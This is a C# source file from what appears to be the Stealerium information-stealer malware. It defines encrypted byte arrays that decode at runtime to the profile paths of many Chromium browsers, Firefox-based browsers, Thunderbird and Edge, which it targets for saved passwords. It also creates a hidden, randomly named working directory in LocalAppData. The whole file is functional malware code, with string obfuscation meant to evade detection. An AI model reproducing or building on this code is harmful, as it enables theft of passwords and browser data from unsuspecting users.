using System;
using System.IO;
using Stealerium.Modules.Implant;

namespace Stealerium.Helpers
{
    public sealed class Paths
    {
        // Encrypted Chromium browser path's
        public static string[] SChromiumPswPaths =
        {
            StringsCrypt.Decrypt(new byte[]
            {
                9, 216, 37, 45, 86, 32, 189, 250, 137, 47, 197, 147, 155, 5, 56, 143, 135, 55, 46, 146, 101, 201, 59,
                90, 175, 22, 156, 249, 121, 143, 26, 75
            }), // \Chromium\User Data\
            StringsCrypt.Decrypt(new byte[]
            {
                120, 7, 66, 212, 159, 20, 166, 132, 13, 4, 30, 105, 167, 138, 75, 198, 37, 249, 196, 37, 169, 74, 179,
                36, 35, 7, 85, 30, 231, 138, 145, 95
            }), // \Google\Chrome\User Data\
            StringsCrypt.Decrypt(new byte[]
            {
                24, 143, 236, 33, 5, 3, 203, 104, 75, 43, 211, 255, 253, 175, 41, 227, 240, 252, 49, 102, 60, 225, 118,
                42, 195, 146, 255, 68, 215, 227, 204, 147
            }), // \Google(x86)\Chrome\User Data\
            StringsCrypt.Decrypt(new byte[]
            {
                232, 48, 140, 129, 61, 46, 255, 110, 119, 91, 143, 94, 9, 90, 115, 95, 143, 127, 28, 212, 98, 201, 99,
                54, 160, 125, 108, 19, 127, 50, 26, 68
            }), // \Opera Software\
            StringsCrypt.Decrypt(new byte[]
            {
                252, 26, 170, 227, 215, 215, 144, 15, 215, 141, 13, 76, 82, 139, 44, 146, 38, 122, 56, 168, 102, 254,
                79, 206, 192, 239, 235, 90, 161, 22, 184, 153, 162, 255, 136, 15, 202, 16, 109, 81, 193, 83, 132, 223,
                232, 6, 144, 24
            }), // \MapleStudio\ChromePlus\User Data\
            StringsCrypt.Decrypt(new byte[]
            {
                210, 4, 159, 167, 117, 227, 148, 247, 69, 84, 62, 17, 26, 160, 38, 240, 26, 202, 93, 66, 0, 198, 192,
                251, 97, 115, 46, 34, 48, 197, 40, 189
            }), // \Iridium\User Data\
            StringsCrypt.Decrypt(new byte[]
            {
                202, 28, 189, 172, 101, 121, 189, 183, 61, 241, 118, 200, 242, 191, 180, 144, 156, 52, 236, 226, 46,
                160, 10, 64, 44, 32, 112, 214, 16, 166, 218, 114
            }), // 7Star\7Star\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                76, 128, 40, 85, 29, 218, 20, 22, 125, 224, 50, 253, 198, 210, 234, 134, 8, 234, 251, 165, 144, 6, 247,
                209, 199, 159, 82, 100, 77, 129, 135, 86
            }), //CentBrowser\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                121, 12, 158, 88, 167, 47, 80, 209, 158, 183, 54, 176, 202, 37, 76, 68, 130, 156, 243, 27, 123, 174,
                223, 20, 159, 138, 196, 62, 159, 210, 83, 209
            }), //Chedot\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                18, 156, 54, 233, 46, 0, 63, 206, 213, 88, 198, 153, 125, 149, 141, 206, 40, 250, 241, 241, 228, 191,
                45, 185, 221, 128, 96, 107, 201, 165, 26, 196
            }), // Vivaldi\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                221, 186, 133, 4, 0, 99, 219, 103, 68, 129, 46, 189, 198, 88, 204, 152, 221, 95, 157, 68, 174, 101, 107,
                35, 58, 89, 214, 1, 122, 12, 155, 159
            }), // Kometa\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                101, 96, 3, 109, 13, 62, 70, 57, 85, 43, 156, 64, 111, 86, 244, 2, 237, 63, 59, 101, 75, 157, 180, 190,
                208, 147, 158, 255, 231, 162, 156, 191
            }), // Elements Browser\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                39, 69, 125, 131, 198, 134, 43, 254, 9, 249, 105, 71, 243, 60, 100, 219, 55, 146, 134, 74, 165, 122, 99,
                96, 250, 47, 72, 127, 122, 13, 200, 9
            }), // Epic Privacy Browser\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                243, 6, 253, 226, 152, 244, 167, 15, 195, 113, 87, 253, 231, 53, 247, 146, 208, 221, 122, 56, 159, 168,
                74, 213, 184, 199, 7, 176, 34, 74, 221, 71
            }), // uCozMedia\Uran\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                226, 163, 187, 215, 24, 232, 193, 39, 219, 178, 254, 252, 190, 171, 144, 125, 116, 108, 32, 222, 67,
                145, 201, 238, 100, 12, 210, 97, 29, 246, 172, 182, 184, 192, 129, 124, 191, 48, 219, 205, 127, 196, 34,
                132, 30, 132, 112, 43, 42, 108, 233, 77, 71, 166, 54, 129, 7, 19, 115, 9, 220, 226, 89, 77
            }), // Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
            StringsCrypt.Decrypt(new byte[]
            {
                144, 155, 123, 178, 20, 243, 76, 136, 27, 192, 111, 9, 61, 232, 31, 241, 25, 184, 87, 236, 25, 235, 0,
                32, 131, 233, 156, 225, 223, 121, 247, 106
            }), // CatalinaGroup\Citrio\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                167, 64, 17, 172, 196, 135, 142, 147, 142, 136, 241, 144, 231, 143, 19, 37, 194, 241, 160, 213, 108,
                207, 51, 159, 193, 153, 226, 155, 223, 132, 221, 169
            }), // Coowon\Coowon\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                224, 223, 234, 44, 135, 130, 18, 251, 33, 31, 98, 174, 78, 170, 204, 61, 201, 168, 106, 237, 139, 36,
                27, 136, 247, 52, 27, 229, 230, 236, 242, 13
            }), // liebao\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                153, 59, 13, 17, 206, 36, 137, 81, 87, 169, 154, 217, 30, 215, 65, 65, 48, 86, 48, 121, 213, 104, 96,
                52, 98, 69, 235, 180, 137, 61, 247, 247
            }), // QIP Surf\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                150, 88, 214, 243, 74, 241, 23, 23, 199, 164, 72, 52, 157, 41, 101, 31, 54, 125, 228, 183, 246, 207,
                254, 158, 187, 84, 226, 55, 187, 107, 80, 232
            }), // Orbitum\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                4, 23, 136, 155, 94, 144, 46, 19, 60, 228, 199, 7, 103, 162, 130, 115, 84, 46, 65, 181, 250, 76, 48, 29,
                5, 251, 37, 114, 162, 153, 130, 180
            }), // Comodo\Dragon\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                196, 121, 102, 73, 123, 64, 50, 146, 177, 24, 231, 63, 58, 205, 172, 221, 143, 187, 163, 149, 142, 243,
                61, 119, 116, 7, 34, 32, 58, 41, 79, 65
            }), // Amigo\User\User Data
            StringsCrypt.Decrypt(new byte[]
                {50, 123, 25, 59, 102, 202, 211, 57, 235, 193, 54, 195, 116, 163, 202, 223}), // Torch\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                177, 90, 196, 106, 171, 71, 130, 237, 96, 43, 245, 49, 15, 80, 133, 25, 81, 0, 103, 16, 188, 141, 51,
                219, 149, 221, 2, 38, 178, 215, 14, 14
            }), // Yandex\YandexBrowser\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                70, 150, 180, 110, 194, 224, 58, 10, 37, 240, 117, 18, 124, 245, 114, 112, 92, 9, 238, 59, 236, 160,
                131, 138, 184, 57, 244, 147, 205, 63, 10, 168
            }), // Comodo\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                88, 174, 210, 65, 23, 228, 247, 33, 191, 41, 6, 121, 42, 1, 161, 192, 21, 9, 142, 245, 135, 195, 27, 60,
                141, 163, 30, 161, 10, 82, 203, 212
            }), // 360Browser\Browser\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                236, 110, 106, 108, 79, 202, 115, 93, 121, 120, 175, 60, 143, 109, 116, 56, 42, 173, 142, 4, 253, 241,
                217, 66, 234, 161, 192, 202, 45, 29, 30, 114
            }), // Maxthon3\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                5, 223, 247, 49, 160, 244, 64, 78, 114, 138, 203, 64, 88, 153, 228, 30, 11, 193, 143, 12, 108, 94, 128,
                172, 130, 20, 203, 221, 122, 202, 161, 179
            }), // K-Melon\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                237, 164, 92, 138, 150, 65, 144, 148, 75, 2, 58, 235, 162, 34, 255, 200, 164, 221, 214, 249, 245, 187,
                170, 231, 20, 51, 233, 10, 19, 89, 110, 132
            }), // CocCoc\Browser\User Data
            StringsCrypt.Decrypt(new byte[]
            {
                83, 127, 11, 224, 26, 231, 17, 137, 47, 114, 54, 161, 148, 56, 88, 154, 187, 24, 145, 251, 78, 197, 100,
                225, 151, 47, 7, 231, 186, 134, 19, 10, 120, 101, 78, 252, 91, 25, 62, 160, 142, 208, 192, 26, 70, 36,
                130, 121
            }) // BraveSoftware\Brave-Browser\User Data
        };

        // Encrypted Firefox based browsers path's
        public static string[] SGeckoBrowserPaths =
        {
            StringsCrypt.Decrypt(new byte[]
            {
                188, 64, 225, 171, 239, 54, 213, 58, 110, 61, 146, 213, 110, 173, 51, 229, 114, 123, 181, 216, 74, 244,
                150, 71, 186, 68, 53, 170, 97, 114, 1, 52
            }), // \Mozilla\Firefox
            StringsCrypt.Decrypt(new byte[]
                {127, 223, 127, 20, 173, 184, 188, 168, 6, 10, 199, 219, 160, 80, 239, 101}), // \Waterfox
            StringsCrypt.Decrypt(new byte[]
                {201, 23, 90, 47, 77, 207, 163, 209, 219, 84, 95, 197, 115, 10, 21, 72}), // \\K-Meleon
            StringsCrypt.Decrypt(new byte[]
                {73, 14, 36, 149, 255, 175, 172, 207, 190, 117, 94, 7, 33, 216, 123, 35}), // \Thunderbird
            StringsCrypt.Decrypt(new byte[]
            {
                185, 229, 111, 43, 51, 42, 91, 5, 111, 199, 205, 166, 74, 105, 46, 2, 221, 24, 203, 108, 147, 182, 5,
                246, 124, 221, 58, 49, 29, 188, 29, 146
            }), // \Comodo\IceDragon
            StringsCrypt.Decrypt(new byte[]
            {
                2, 4, 116, 64, 73, 85, 158, 255, 136, 158, 116, 117, 72, 146, 22, 221, 51, 104, 1, 80, 128, 155, 15,
                195, 89, 220, 54, 229, 181, 168, 186, 171
            }) // \8pecxstudios\Cyberfox
        };

        // Encrypted Edge browser path
        public static string EdgePath = StringsCrypt.Decrypt(new byte[]
        {
            111, 14, 233, 172, 158, 128, 172, 228, 81, 93, 48, 162, 132, 149, 84, 177, 189, 163, 109, 14, 234, 95, 47,
            227, 179, 98, 239, 126, 45, 138, 192, 88
        }); // Microsoft\Edge\User Data

        // Appdata
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string Lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        // Create working directory
        public static string InitWorkDir()
        {
            var workdir = Path.Combine(
                Lappdata, StringsCrypt.GenerateRandomData(Config.Mutex));

            if (Directory.Exists(workdir)) return workdir;
            Directory.CreateDirectory(workdir);
            Startup.HideFile(workdir);

            return workdir;
        }
    }
}